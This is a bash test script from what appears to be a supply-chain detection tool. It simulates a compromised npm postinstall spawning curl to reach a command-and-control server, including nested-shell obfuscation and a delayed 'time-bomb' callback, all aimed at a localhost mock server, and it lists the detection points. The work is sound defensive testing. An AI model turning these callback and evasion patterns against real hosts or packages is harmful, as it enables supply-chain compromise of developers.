#!/bin/bash
# =============================================================================
# Fenceline Test: Child Process C2 Communication
# =============================================================================
# Simulates: Node spawning child process that contacts command-and-control
# Real-world examples: Nx compromise (2025) — node -> curl -> attacker C2
#
# Attack pattern:
#   1. Compromised package runs postinstall
#   2. Node.js spawns child_process.exec() or child_process.spawn()
#   3. Child process (curl, wget, sh) contacts C2 server
#   4. C2 returns additional payload or receives exfiltrated data
#
# Why this is hard to detect:
#   - The parent process (node) looks normal
#   - The child process (curl) is a legitimate system tool
#   - Only the process tree reveals the suspicious chain
#
# Safety: All connections to localhost only.
# =============================================================================

set -euo pipefail

PORT=9997
SERVER_PID=""
CHILD_PIDS=()

cleanup() {
    echo ""
    echo "[CLEANUP] Stopping all processes..."
    for pid in "${CHILD_PIDS[@]}"; do
        kill "$pid" 2>/dev/null || true
    done
    if [ -n "$SERVER_PID" ]; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
    echo "[CLEANUP] Done."
}
trap cleanup EXIT

echo "============================================="
echo "  Fenceline Test: Child Process C2"
echo "============================================="
echo ""

# --- SETUP ---
echo "[SETUP] Starting mock C2 server on localhost:$PORT..."
python3 -m http.server "$PORT" --bind 127.0.0.1 &>/dev/null &
SERVER_PID=$!
sleep 1
echo "[SETUP] C2 server running (PID $SERVER_PID)"
echo ""

# --- SIMULATION ---
echo "[SIMULATION] Simulating child process attack chain..."
echo ""

# Pattern 1: node -> child_process.exec -> curl (Nx-style)
echo "[SIM 1/3] Node spawning curl via child_process (Nx pattern)"
if command -v node &>/dev/null; then
    node -e "
        const { exec } = require('child_process');
        exec('curl -s -o /dev/null http://127.0.0.1:$PORT/c2-checkin?id=compromised-pkg', (err, stdout, stderr) => {
            process.stdout.write('  -> node (PID ' + process.pid + ') spawned curl child process\n');
            process.stdout.write('  -> Process chain: node -> sh -> curl -> localhost:$PORT\n');
        });
    " 2>/dev/null
    sleep 2
else
    echo "  -> [SKIP] node not available, simulating with bash"
    bash -c "curl -s -o /dev/null 'http://127.0.0.1:$PORT/c2-checkin?id=compromised-pkg'" 2>/dev/null || true
    echo "  -> bash spawned curl child process"
fi
echo ""

# Pattern 2: Nested shell execution (obfuscation technique)
echo "[SIM 2/3] Nested shell execution (obfuscation via sh -c)"
bash -c "sh -c 'curl -s -o /dev/null http://127.0.0.1:$PORT/payload-stage2'" 2>/dev/null &
CHILD_PIDS+=($!)
echo "  -> Process chain: bash -> sh -> curl -> localhost:$PORT"
echo "  -> Nested shells hide the real intent from simple process monitoring"
sleep 1
echo ""

# Pattern 3: Background process with delayed execution
echo "[SIM 3/3] Delayed background C2 callback (time-bomb pattern)"
(
    # Simulates: attacker delays C2 callback to avoid install-time monitoring
    sleep 2
    curl -s -o /dev/null "http://127.0.0.1:$PORT/delayed-callback?t=2s" 2>/dev/null || true
) &
CHILD_PIDS+=($!)
DELAYED_PID=$!
echo "  -> Background process PID $DELAYED_PID spawned with 2s delay"
echo "  -> Simulates time-bomb: C2 callback happens after install appears complete"
echo ""

# Wait for delayed process
echo "[WAIT] Waiting for delayed callback..."
sleep 3
echo "  -> Delayed callback should have fired"
echo ""

# Show process relationships
echo "[INFO] Process tree during simulation:"
echo "  $$  (test script - simulates npm install)"
echo "  ├── $SERVER_PID (mock C2 server)"
for pid in "${CHILD_PIDS[@]}"; do
    echo "  ├── $pid (spawned child - curl to C2)"
done
echo ""

# --- DETECTION POINTS ---
echo "============================================="
echo "  DETECTION POINTS"
echo "============================================="
echo ""
echo "A supply chain detector should flag ALL of the following:"
echo ""
echo "  1. SUSPICIOUS PROCESS TREE"
echo "     -> node/python spawning sh/bash/curl/wget"
echo "     -> Package manager process tree should NOT include curl"
echo "     -> Any exec/spawn of network tools from install scripts"
echo ""
echo "  2. INDIRECT NETWORK ACCESS"
echo "     -> Parent process (node) doesn't make the connection"
echo "     -> Child process (curl) makes the actual C2 contact"
echo "     -> Monitoring only the parent would miss this entirely"
echo ""
echo "  3. DELAYED EXECUTION"
echo "     -> Background process with sleep/timeout before callback"
echo "     -> Designed to fire AFTER install monitoring stops"
echo "     -> Process outlives the install command"
echo ""
echo "  4. OBFUSCATION VIA SHELL NESTING"
echo "     -> node -> sh -c -> curl (adds indirection layer)"
echo "     -> Multiple shell layers hide the command from simple parsing"
echo "     -> Base64-encoded commands passed to sh -c"
echo ""
echo "[RESULT] Test simulation complete."
